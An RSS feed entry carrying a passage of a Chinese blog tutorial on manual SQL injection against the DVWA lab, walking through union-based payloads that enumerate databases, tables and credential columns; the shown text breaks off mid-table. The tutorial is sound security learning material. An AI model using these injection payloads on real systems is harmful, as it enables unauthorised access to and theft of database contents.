<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>技术学习 on kakahuote</title>
        <link>https://blog.928330.xyz/categories/%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/</link>
        <description>Recent content in 技术学习 on kakahuote</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>zh-cn</language>
        <copyright>Example Person</copyright>
        <lastBuildDate>Wed, 02 Jul 2025 01:28:30 +0800</lastBuildDate><atom:link href="https://blog.928330.xyz/categories/%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>SQL注入：从入门到入土</title>
        <link>https://blog.928330.xyz/p/sql%E6%B3%A8%E5%85%A5%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/</link>
        <pubDate>Wed, 02 Jul 2025 00:52:02 +0800</pubDate>
        
        <guid>https://blog.928330.xyz/p/sql%E6%B3%A8%E5%85%A5%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/</guid>
        <description>&lt;p&gt;SQL注入是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，以此来实现欺骗数据库服务器执行非授权的任意查询，从而得到相应的数据信息&lt;/p&gt;
&lt;p&gt;我们可以选择&lt;strong&gt;手工注入&lt;/strong&gt;，也能够选择使用自动化工具&lt;strong&gt;sqlmap&lt;/strong&gt;进行注入&lt;/p&gt;
&lt;h1 id=&#34;手工注入&#34;&gt;手工注入
&lt;/h1&gt;&lt;h2 id=&#34;0-环境配置&#34;&gt;#0 环境配置
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;使用靶机：DVWA mysql&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;将DVWA的security级别设置为low，可以看到php源码中是一句简单的查询语句，没有进行任何过过滤&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;当用户输入查询内容的时候，$id将会被替换成此内容：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$query&lt;/span&gt;  &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;SELECT first_name, last_name FROM users WHERE user_id = &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;$id&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;比如，我们输入1，那么执行的语句就是&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;first_name&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;last_name&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;users&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;user_id&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;1&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;那如果我们输入1&amp;rsquo; and 1=1#:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;first_name&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;last_name&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;users&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;user_id&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;1&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;and&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;#&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;可以看到，前面的&amp;rsquo;&amp;lsquo;闭合了，后面的&amp;rsquo;被我们注释了，中间的and1=1会被正常执行&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;那么我们完全可以在这里面插入自己想要执行的sql语句，这就是SQL注入！&lt;/p&gt;
&lt;h2 id=&#34;1-union联合查询注入&#34;&gt;#1 union联合查询注入
&lt;/h2&gt;&lt;p&gt;虽然知道可以执行任意sql代码了，但是我们又不知道有哪些表，表里面有哪些元素，有什么用呢？&lt;/p&gt;
&lt;p&gt;所以，现在我们需要通过一系列的操作，来确定这些东西：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1.判断是否存在注入，注入是字符型还是数字型&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2.猜测SQL查询语句中的字段数&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3.确定显示的字段顺序&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4.获取当前数据库&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5.获取数据库中的表&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6.获取表中的字段名&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;7.显示字段信息&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;那么，开始吧！&lt;/p&gt;
&lt;h3 id=&#34;常用函数&#34;&gt;常用函数
&lt;/h3&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;功能类别&lt;/th&gt;
          &lt;th&gt;函数/语句&lt;/th&gt;
          &lt;th&gt;主要数据库&lt;/th&gt;
          &lt;th&gt;功能描述&lt;/th&gt;
          &lt;th&gt;注入示例&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;系统信息查询&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;database()&lt;/code&gt; 或 &lt;code&gt;schema()&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;MySQL&lt;/td&gt;
          &lt;td&gt;获取当前数据库的名称&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;&#39; union select 1,database() #&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;version()&lt;/code&gt; 或&lt;code&gt;@@version&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;通用&lt;/td&gt;
          &lt;td&gt;获取数据库的详细版本号&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;&#39; union select 1,version() #&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;user()&lt;/code&gt; 或 &lt;code&gt;current_user()&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;通用&lt;/td&gt;
          &lt;td&gt;获取执行查询的数据库用户名&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;&#39; union select 1,user() #&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;@@hostname&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;MySQL, MSSQL&lt;/td&gt;
          &lt;td&gt;获取数据库服务器的主机名&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;&#39; union select 1,@@hostname #&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;@@datadir&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;MySQL&lt;/td&gt;
          &lt;td&gt;获取数据库文件的存储路径&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;&#39; union select 1,@@datadir #&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;数据查询与拼接&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;group_concat()&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;MySQL, SQLite&lt;/td&gt;
          &lt;td&gt;&lt;strong&gt;将多行结果合并成一个字符串一行显示&lt;/strong&gt;，用于一次性列出所有表名/列名&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;&#39; union select 1,group_concat(table_name) from information_schema.tables #&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;concat()&lt;/code&gt; 或 &lt;code&gt;concat_ws()&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;MySQL&lt;/td&gt;
          &lt;td&gt;将多个字符串或列连接成一个，&lt;strong&gt;但是不改变行数&lt;/strong&gt;，用于拼接用户名和密码等字段&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;&#39; union select 1,concat(username,&#39;:&#39;,password) from users #&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;count()&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;通用&lt;/td&gt;
          &lt;td&gt;统计行数&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;&#39; union select 1,count(*) from users #&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;substring()&lt;/code&gt; 或 &lt;code&gt;limit&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;通用&lt;/td&gt;
          &lt;td&gt;截取字符串或按行返回。主要用于盲注，逐个字符或逐行猜解数据&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;&#39; and substring(database(),1,1)=&#39;a&#39; #&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;1判断注入是字符类型or数字型&#34;&gt;1.判断注入是字符类型or数字型
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;为什么需要判断？因为数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;**数字型：**select * from table where id =$id，我们可以直接输入&lt;code&gt;1 and ...&lt;/code&gt; 进行执行:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;table&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;where&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;id&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;and&lt;/span&gt; ...
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;**字符型：**select * from table where id=&amp;rsquo;$id&amp;rsquo;我们需要输入&lt;code&gt;1&#39; and ... #&lt;/code&gt;  ，闭合前后单引号&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;table&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;where&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;1&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;and&lt;/span&gt; ... &lt;span style=&#34;color:#56b6c2&#34;&gt;#&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;       
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;关于注释：&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;ndash; 是官方的注释，后面必须跟空格&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;# 是mysql特有的注释，后面无需跟空格&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;有的网站会过滤空格导致&amp;ndash;报错，这时候可以使用&amp;ndash;+，用+代替空格&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;以上方法不一定全部适用，需要结合实际情况尝试&lt;/strong&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;基于这种思路，只要我们能够测试注入成功，使得页面不出现语法报错，那么就可以借此判断出类型：&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;测试目的&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;测试Payload&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;预期结果&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;判断数字型&lt;/strong&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;1 and 1=1&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;页面 &lt;strong&gt;正常&lt;/strong&gt;，与 &lt;code&gt;?id=1&lt;/code&gt; 时相同&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;1 and 1=2&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;页面 &lt;strong&gt;内容异常&lt;/strong&gt; (如变空)，但不是程序或语法报错&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;判断字符型&lt;/strong&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;1&#39; and &#39;1&#39;=&#39;1&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;页面 &lt;strong&gt;正常&lt;/strong&gt;，与 &lt;code&gt;?id=&#39;1&#39;&lt;/code&gt; 时相同&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;1&#39; and &#39;1&#39;=&#39;2&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;页面 &lt;strong&gt;内容异常&lt;/strong&gt; (如变空)，但不是程序或语法报错&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;strong&gt;分别测试是否对应的结果&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;还有更加简单（但是不知道是否一定有效的方法）：&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;输入&lt;code&gt;2-1&lt;/code&gt;，如果是数字型，就会执行&lt;code&gt;2-1&lt;/code&gt;运算，&lt;code&gt;id=1&lt;/code&gt;；如果是字符型，就会是&lt;code&gt;id=2&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;可以构造一个&lt;code&gt;m-n&lt;/code&gt;，&lt;code&gt;m&lt;/code&gt;是不存在的&lt;code&gt;id&lt;/code&gt;，但&lt;code&gt;m-n&lt;/code&gt;结果是存在的&lt;code&gt;id&lt;/code&gt;，依据结果来判断是字符型还是数字型&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;这一点在盲注时比较方便&lt;/strong&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;通过以上测试，我们知道了现在DVWA的注入类型是字符型&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;color:#fab920;font-size:15px&#34;&gt;&lt;strong&gt;当然，在写题的时候很有可能你一个也试不出来，因为它是被&lt;code&gt;(&#39;&#39;)&lt;/code&gt;或者&lt;code&gt;&amp;quot;&amp;quot;&lt;/code&gt;包裹的，这就需要你凭感觉试了&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;color:#fab920;font-size:15px&#34;&gt;&lt;strong&gt;不过在此之前，先检查一下你之前的语句有没有写对吧~&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;2猜测sql查询语句中的字段数列数&#34;&gt;2.猜测SQL查询语句中的字段数（列数）
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;从1开始，使用order by语句指定查询结果依照第n列排序，如果报错，说明不存在该行列&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; or 1=1 order by 1 #   
1&amp;#39; or 1=1 order by 2 #  
1&amp;#39; or 1=1 order by 3 #      //报错了
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;order by 3的时候报错，说明当前查询的表中只有2列&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;and&lt;/code&gt;：如果and前为真，执行后面内容&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;or&lt;/code&gt;：如果前面为假，才执行后面内容&lt;/strong&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;h3 id=&#34;3确定显示的字段顺序&#34;&gt;3.确定显示的字段顺序
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;虽然我们知道了字段数，但很可能这些字段不是都显示在网页前端的&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;假如其中某些字段的查询结果是会返回到前端的，那么我们就需要知道这些字段中哪些结果会回显，如果我们直接输入查询字段进行查询，语句会非常冗长，而且很可能还需要做很多次测试&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;这时候我们利用一个简单的语句：select 1,2,3，根据显示在页面上的数字就可以知道回显位置（sql特性）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;之后，我们只需要把这个数字改成我们想查询的内容（如id,password），就会在窗口显示我们想要的结果&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; union select 1,2 #
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250626115719525.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250626115719525&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;这样就确定了网站执行的SQL语句为：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Firstname&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;Surname&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;xx&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;where&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;ID&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;从过程中也不难看出，其实确定字段列数和显示顺序可以一起做&lt;/strong&gt;
&lt;strong&gt;从union select 1开始，一直增加select后的位数，直到报错为止&lt;/strong&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;h3 id=&#34;4获取当前数据库&#34;&gt;4.获取当前数据库
&lt;/h3&gt;&lt;p&gt;知道了回显位，我们就可以把回显位替换成想要的数据&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;mark&gt;这里一定要写全，有多少字段，select后面就要有多少相应的字段&lt;/mark&gt;&lt;/strong&gt;：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; union select 1,database() #
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;&lt;code&gt;database()&lt;/code&gt; 是mysql内置函数，当数据库执行到它时，会将其替换为当前正在使用的数据库的名称&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250626135800624.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250626135800624&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;于是，我们就知道了当前数据库名称为&lt;code&gt;dvwa&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;5获取数据库中的表&#34;&gt;5.获取数据库中的表
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;information_schema.tables表存储了数据表的元数据信息：&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;字段名 (Field Name)&lt;/th&gt;
          &lt;th&gt;描述 (Description)&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;table_schema&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;记录该表所在的数据库的名称&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;table_name&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;记录数据表的名称&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;engine&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;记录该表使用的存储引擎，例如 &lt;code&gt;InnoDB&lt;/code&gt;, &lt;code&gt;MyISAM&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;table_rows&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;关于表中总行数的一个粗略估计值&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;data_length&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;记录数据表本身的大小（单位：字节）&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;index_length&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;记录数据表索引的大小（单位：字节）&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;row_format&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;记录行的格式，例如 &lt;code&gt;Dynamic&lt;/code&gt; 或 &lt;code&gt;Compressed&lt;/code&gt;，可用于判断表是否被压缩&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;我们就可以从中得到想要的信息：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250626142534142.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250626142534142&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;上面的语句效果等同于下面的语句，只不过使用了&lt;code&gt;group_concat()&lt;/code&gt;，让输出的内容拼成了一个字符串：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; union select 1,table_name from information_schema.tables where table_schema=&amp;#39;dvwa&amp;#39; #
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250626142649062.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250626142649062&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;这样就知道了dvwa里面一共有两个表，分别为guestbook和users&lt;/p&gt;
&lt;h3 id=&#34;6获取表中的字段名&#34;&gt;6.获取表中的字段名
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;information_schema.columns表存储了所有表所有列的元数据信息：&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;字段名&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;描述&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;COLUMN_NAME&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;记录列的名称&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;TABLE_NAME&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;记录该列所属的数据表的名称&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;TABLE_SCHEMA&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;记录该列所属的数据库的名称&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
